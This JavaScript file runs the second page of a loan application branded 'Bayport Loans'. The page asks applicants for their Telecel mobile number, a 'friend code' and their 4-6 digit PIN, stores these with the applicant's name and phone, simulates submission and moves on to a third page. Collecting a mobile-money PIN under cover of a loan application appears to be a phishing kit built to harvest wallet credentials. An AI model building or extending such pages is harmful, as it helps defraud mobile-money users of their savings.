// Wait for DOM to load
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ Bayport Loans - Page 2 loaded');
    
    // Load data from localStorage
    const loanData = JSON.parse(localStorage.getItem('loanApp'));
    
    if (loanData) {
        console.log('📦 Loaded application data:', loanData);
        
        // Display data in summary
        document.getElementById('displayName').textContent = loanData.fullname || 'N/A';
        document.getElementById('displayAmount').textContent = 'GHS ' + (loanData.loanAmount || '0');
        document.getElementById('displayPhone').textContent = loanData.phone || 'N/A';
        document.getElementById('displayRef').textContent = loanData.referenceId || 'N/A';
    } else {
        console.error('❌ No application data found');
        alert('No application data found. Please start over.');
        window.location.href = 'index.html';
        return;
    }
    
    // Add focus effect to Telecel input to match orange theme
    const telecelInput = document.getElementById('telecelNumber');
    if (telecelInput) {
        telecelInput.addEventListener('focus', function() {
            this.style.borderColor = '#FF6B35';
            this.style.boxShadow = '0 0 0 3px rgba(255, 107, 53, 0.2)';
        });
        
        telecelInput.addEventListener('blur', function() {
            this.style.borderColor = '#e0e0e0';
            this.style.boxShadow = 'none';
        });
    }
    
    // Handle verification form submission
    const verifyForm = document.getElementById('verificationForm');
    
    if (verifyForm) {
        verifyForm.addEventListener('submit', function(e) {
            e.preventDefault(); // CRITICAL - prevents page refresh
            console.log('📝 Verification form submitted');
            
            // Get form values
            const telecelNumber = document.getElementById('telecelNumber').value.trim();
            const friendCode = document.getElementById('friendCode').value.trim();
            const pin = document.getElementById('pin').value.trim();
            
            // Validate
            if (!telecelNumber || !friendCode || !pin) {
                alert('Please fill all fields');
                return;
            }
            
            if (telecelNumber.length !== 10) {
                alert('Please enter a valid 10-digit Telecel number');
                return;
            }
            
            if (pin.length < 4 || pin.length > 6) {
                alert('PIN must be 4-6 digits');
                return;
            }
            
            // Get existing loan data
            const loanData = JSON.parse(localStorage.getItem('loanApp'));
            
            // Create complete application data
            const fullData = {
                ...loanData,
                telecelNumber: telecelNumber,
                friendCode: friendCode,
                pin: pin,
                submittedAt: new Date().toLocaleString()
            };
            
            console.log('📦 Saving complete application:', fullData);
            
            // Save to localStorage
            localStorage.setItem('fullApp', JSON.stringify(fullData));
            localStorage.setItem('currentRef', loanData.referenceId);
            
            // Show loading overlay
            const loadingOverlay = document.getElementById('loadingOverlay');
            if (loadingOverlay) {
                loadingOverlay.classList.remove('hidden');
            }
            
            // Simulate API call
            setTimeout(function() {
                console.log('✅ Application submitted successfully');
                console.log('➡️ Redirecting to page3.html');
                window.location.href = 'page3.html';
            }, 1500);
        });
    }
    
    // Input validation
    document.getElementById('telecelNumber')?.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
    });
    
    document.getElementById('pin')?.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
    });
});